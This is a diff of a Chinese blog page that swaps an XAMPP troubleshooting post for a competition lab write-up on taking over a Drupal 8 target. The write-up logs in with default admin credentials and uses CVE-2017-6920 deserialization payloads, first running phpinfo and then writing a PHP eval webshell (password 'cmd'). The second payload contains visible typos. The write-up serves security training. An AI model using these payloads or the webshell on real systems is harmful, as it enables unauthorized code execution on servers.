@@ -4,25 +4,33 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>XAMPP Apache shutdown unexpectedly问题解决 | GetFlag&#39;s Blog</title>
+    <title>企业赛真题-drupal渗透-Writeup | GetFlag&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="GetFlag">
     
 
     
-    <meta name="description" content="在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。">
-<meta name="keywords" content="XAMPP,error">
+    <meta name="description" content="西普杯铁人三项赛，训练营企业赛真题drupal渗透。铁三全是CVE的洞，真给劲。测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell">
+<meta name="keywords" content="综合渗透,铁人三项,Writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XAMPP Apache shutdown unexpectedly问题解决">
-<meta property="og:url" content="http://flag0.com/2018/02/27/AXMPP安装问题解决/index.html">
+<meta property="og:title" content="企业赛真题-drupal渗透-Writeup">
+<meta property="og:url" content="http://flag0.com/2018/03/22/铁三真题-drupal-Writeup/index.html">
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
-<meta property="og:description" content="在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。">
+<meta property="og:description" content="西普杯铁人三项赛，训练营企业赛真题drupal渗透。铁三全是CVE的洞，真给劲。测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:updated_time" content="2018-03-19T08:39:00.153Z">
+<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/001.png">
+<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/002.png">
+<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/003.png">
+<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/004.png">
+<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/005.png">
+<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/006.png">
+<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/007.png">
+<meta property="og:updated_time" content="2018-03-22T10:49:30.673Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XAMPP Apache shutdown unexpectedly问题解决">
-<meta name="twitter:description" content="在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。">
+<meta name="twitter:title" content="企业赛真题-drupal渗透-Writeup">
+<meta name="twitter:description" content="西普杯铁人三项赛，训练营企业赛真题drupal渗透。铁三全是CVE的洞，真给劲。测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell">
+<meta name="twitter:image" content="http://flag0.com/img/images/铁三真题drupal/001.png">
 
     
     <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
@@ -78,14 +86,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/02/27/AXMPP安装问题解决/" title="XAMPP Apache shutdown unexpectedly问题解决" itemprop="url">XAMPP Apache shutdown unexpectedly问题解决</a>
+      <a href="/2018/03/22/铁三真题-drupal-Writeup/" title="企业赛真题-drupal渗透-Writeup" itemprop="url">企业赛真题-drupal渗透-Writeup</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-02-27T15:00:03.000Z" itemprop="datePublished"> Published 2018-02-27</time>
+    <time datetime="2018-03-22T08:00:00.000Z" itemprop="datePublished"> Published 2018-03-22</time>
     
   </p>
 </header>
@@ -94,47 +102,41 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-报错信息"><span class="toc-number">1.</span> <span class="toc-text">0x01: 报错信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-端口冲突"><span class="toc-number">2.</span> <span class="toc-text">0x02: 端口冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-服务冲突"><span class="toc-number">3.</span> <span class="toc-text">0x03: 服务冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Warning-strftime-未设置时区"><span class="toc-number">4.</span> <span class="toc-text">0x04: Warning: strftime() 未设置时区</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任务目标"><span class="toc-number">1.</span> <span class="toc-text">0x01:任务目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-题目分析"><span class="toc-number">2.</span> <span class="toc-text">0x02:题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-致谢"><span class="toc-number">3.</span> <span class="toc-text">0x03:致谢</span></a></li></ol>
 		
 		</div>
 		
-		<p>在上软件测试课时，使用XAMPP搭建testlink过程中出现了apache服务器启动不了的问题，上课时在本机并没有解决，临时用的phpstudy搭建环境安装，课后研究发现问题。<br><a id="more"></a></p>
-<h2 id="0x01-报错信息"><a href="#0x01-报错信息" class="headerlink" title="0x01: 报错信息"></a>0x01: 报错信息</h2><pre><code>20:20:57  [Apache]     Error: Apache shutdown unexpectedly.
-20:20:57  [Apache]     This may be due to a blocked port, missing dependencies, 
-20:20:57  [Apache]     improper privileges, a crash, or a shutdown by another method.
-20:20:57  [Apache]     Check the &quot;/xampp/apache/logs/error.log&quot; file
-20:20:57  [Apache]     and the Windows Event Viewer for more 
-</code></pre><h2 id="0x02-端口冲突"><a href="#0x02-端口冲突" class="headerlink" title="0x02: 端口冲突"></a>0x02: 端口冲突</h2><p>搜索后，网上大多都说是端口冲突，遂更改端口。</p>
-<pre><code>点击apache右面的Config按钮，打开httpd.conf 找到Listen 80修改为其他未被占用的端口
-</code></pre><p>结果，修改为了8080，8081，8000…(emmmmmm)等确定不会被占用的端口后仍然出现该错误提示。</p>
-<h2 id="0x03-服务冲突"><a href="#0x03-服务冲突" class="headerlink" title="0x03: 服务冲突"></a>0x03: 服务冲突</h2><p>后来由同学提醒发现了和Vmware存在冲突<br>课后仔细研究发现，</p>
-<pre><code>C:\Users\KEY&gt;netstat -aon|findstr &quot;443&quot;
-TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       7460
-TCP    10.232.216.11:52933    106.11.62.15:443       ESTABLISHED     9696
-TCP    10.232.216.11:62465    52.230.84.217:443      ESTABLISHED     4464
-TCP    [::]:443               [::]:0                 LISTENING       7460
-</code></pre><p>VMware占用了443端口</p>
-<blockquote>
-<p>VMware中的Shared VMs占用了443端口，Shared VMs是用于远程连接服务器，注册、管理虚拟机用的，也就是可以用vmware作为虚拟机服务器。对一般同学来说用处不大，可以直接禁用掉这个功能。</p>
-</blockquote>
-<p>解决方法：<br>1.直接禁用掉VMware中的Shared VMs功能</p>
-<pre><code>编辑-&gt;首选项-&gt;共享虚拟机-&gt;禁用共享
-</code></pre><p>2.在服务中禁用掉VMeare Workstation Serveice服务<br>3.修改httpd-ssl.conf中的443端口为其他数字</p>
-<pre><code>点击apache右面的Config按钮，打开httpd-ssl.conf 找到Listen 443修改为其他未被占用的端口,例如442等
-</code></pre><p>修改后再次问题解决，点击Start，成功启动。<br>apache服务器启动起来了，问题并没有完全解决。</p>
-<h2 id="0x04-Warning-strftime-未设置时区"><a href="#0x04-Warning-strftime-未设置时区" class="headerlink" title="0x04: Warning: strftime() 未设置时区"></a>0x04: Warning: strftime() 未设置时区</h2><p>安装完成后，页面未能正常显示，出现了php错误代码</p>
-<pre><code>Warning: strftime(): It is not safe to rely on the system&apos;s timezone settings. You are 
-*required* to use the date.timezone setting or the date_default_timezone_set() function. 
-In case you used any of those methods and you are still getting this warning, you most 
-likely misspelled the timezone identifier. We selected the timezone &apos;UTC&apos; for now, but 
-please set date.timezone to select your timezone. in 
-C:\Apache24\htdocs\testlink\config.inc.php on line 781
-</code></pre><p>根据错误信息翻译得</p>
-<pre><code>依靠系统的时区设置是不安全的。你*需要*使用date.timezone设置或date_default_timezone_set()功能。
-如果你用那些方法，你仍然得到这样的警告，你最有可能拼错的时区标识符。我们选择的时区的UTC的现在，
-但请date.timezone选择您的时区。
-</code></pre><p>php.ini中设置时区解决问题</p>
-<pre><code>打开php.ini找到date.timezone = &quot;&quot; 如有去掉前面的分号,并将&quot;&quot;内改为Asia/Shanghai 
+		<p>西普杯铁人三项赛，训练营企业赛真题drupal渗透。<br>铁三全是CVE的洞，真给劲。<br>测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell<br><a id="more"></a></p>
+<h2 id="0x01-任务目标"><a href="#0x01-任务目标" class="headerlink" title="0x01:任务目标"></a>0x01:任务目标</h2><p><img src="\img\images\铁三真题drupal\001.png" alt="images"><br>可以看到只是让我们拿webshell，没有涉及提权和内网渗透</p>
+<h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02:题目分析"></a>0x02:题目分析</h2><p>从题目中就可以看出，这次的靶机web用的drupal搭建，搜一下在网上drupal爆出的漏洞</p>
+<p>可以发现drupal爆出了两个漏洞</p>
+<ul>
+<li>Drupal SQL注入漏洞(CVE-2014-3704)[7.31-7.x]</li>
+<li>Drupal 远程代码执行漏洞分析(CVE-2017-6920)[8.x]</li>
+</ul>
+<p>这里思路就是看影响版本，更符合哪个，但是我们在这个cms里面看不到任何的版本信息，这种情况下只能逐个尝试，另外由于是综合渗透环境，除了纯web这块，也可以尝试下去用别的思路渗透进去</p>
+<p>首先打开网站<br>发现右上角有Login连接，点击登录<br><img src="\img\images\铁三真题drupal\002.png" alt="images"><br>尝试账号admin密码admin登陆成功<br><img src="\img\images\铁三真题drupal\003.png" alt="images"><br>按照CVE-2017-6920的思路访问</p>
+<pre><code>http://192.168.1.3/admin/config/development/configuration/single/import
+</code></pre><p>打开如下页面，并设置Configuration type为Simple configuration<br>任意输入Configuration name内容，在Paste your Configuration here框中输入如下payload</p>
+<pre><code>!php/object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:{s:33:\&quot;\0GuzzleHttp\\Psr7\\
+FnStream\0methods\&quot;;a:1:{s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;}s:9:\&quot;_fn_close\&quot;;s:7:\
+&quot;phpinfo\&quot;;}&quot;
+</code></pre><p><img src="\img\images\铁三真题drupal\004.png" alt="images"><br>点击import提交<br>效果如下<br><img src="\img\images\铁三真题drupal\005.png" alt="images"><br>在phpinfo页面搜索DOCUMNET_ROOT找到web根目录<br><img src="\img\images\铁三真题drupal\006.png" alt="images"></p>
+<pre><code>/var/www/html/drupal8/
+</code></pre><p>构造如下payload，写入webshell</p>
+<pre><code>!php/object &quot;0:31&quot;:\&quot;GuzzleHttp\\Cookie\\FileCookieJar\&quot;:4:{s:41:\&quot;\0GuzzleHttp\\
+Cookie\\FileCookieJar\0filename\&quot;;s:31\&quot;/var/www/html/drupal8/shell.php\&quot;;s:52:\&quot;\
+0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\&quot;;b:0;s:36:\
+&quot;\0GuzzHttp\\Cookie\CookieJar\0cookies\&quot;;a:1:{i:0;0:27:\&quot;GuzzleHttp\\Cookie\\
+SetCookie\&quot;:1:{s:33:\&quot;\0GuzzleHttp\\Cookie\SetCookie\0data\&quot;;a:10:{s:4:\&quot;Name\
+&quot;;s:4:\&quot;123a\&quot;;s:5:\&quot;Value\&quot;;s:1:\&quot;0\&quot;;s:6:\&quot;Domain\&quot;;s:1:\&quot;a\&quot;;s:4:\&quot;Path\&quot;;s
+:1:\&quot;a\&quot;;s:7:\&quot;Max-Age\&quot;;N;s:7:\&quot;Expires\&quot;;i:123456;s:6:\&quot;Secure\&quot;;b:0;s:7:\&quot;
+Discard\&quot;;b:0;s:8:\&quot;HttpOnly\&quot;;b:0;s:1:\&quot;a\&quot;;s:25:\&quot;&lt;?php eval($_POST[cmd])?&gt;\&quot;;}}}
+s:39:\&quot;\0GuzzleHttp\Cookie\\CookieJar\0strictMode\&quot;;N;}&quot;&quot;
+</code></pre><p>点击import即可看到web根目录下写入了shell.php木马文件密码cmd<br>用菜刀连接即可</p>
+<p><img src="\img\images\铁三真题drupal\007.png" alt="images"></p>
+<p>ps:<br>payload在实验工具文件夹下</p>
+<h2 id="0x03-致谢"><a href="#0x03-致谢" class="headerlink" title="0x03:致谢"></a>0x03:致谢</h2><pre><code>https://paper.seebug.org/334/
 </code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
@@ -142,13 +144,13 @@ C:\Apache24\htdocs\testlink\config.inc.php on line 781
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/XAMPP/">XAMPP</a><a href="/tags/error/">error</a>
+  <span></span> <a href="/tags/综合渗透/">综合渗透</a><a href="/tags/铁人三项/">铁人三项</a><a href="/tags/Writeup/">Writeup</a>
   </div>
 
 </div>
@@ -157,7 +159,7 @@ C:\Apache24\htdocs\testlink\config.inc.php on line 781
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://flag0.com/2018/02/27/AXMPP安装问题解决/" data-title="XAMPP Apache shutdown unexpectedly问题解决 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://flag0.com/2018/03/22/铁三真题-drupal-Writeup/" data-title="企业赛真题-drupal渗透-Writeup | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -170,19 +172,11 @@ C:\Apache24\htdocs\testlink\config.inc.php on line 781
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2018/03/12/PHP-PDO技术/" title="PHP PDO学习笔记">
-  <strong>上一篇：</strong><br/>
-  <span>
-  PHP PDO学习笔记</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2018/02/27/docker环境使用笔记/"  title="docker 环境使用笔记">
+<a href="/2018/03/19/综合渗透/"  title="综合渗透笔记 (持续更新)">
  <strong>下一篇：</strong><br/> 
- <span>docker 环境使用笔记
+ <span>综合渗透笔记 (持续更新)
 </span>
 </a>
 </div>
@@ -199,7 +193,7 @@ C:\Apache24\htdocs\testlink\config.inc.php on line 781
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-报错信息"><span class="toc-number">1.</span> <span class="toc-text">0x01: 报错信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-端口冲突"><span class="toc-number">2.</span> <span class="toc-text">0x02: 端口冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-服务冲突"><span class="toc-number">3.</span> <span class="toc-text">0x03: 服务冲突</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Warning-strftime-未设置时区"><span class="toc-number">4.</span> <span class="toc-text">0x04: Warning: strftime() 未设置时区</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任务目标"><span class="toc-number">1.</span> <span class="toc-text">0x01:任务目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-题目分析"><span class="toc-number">2.</span> <span class="toc-text">0x02:题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-致谢"><span class="toc-number">3.</span> <span class="toc-text">0x03:致谢</span></a></li></ol>
  
   </div>
 
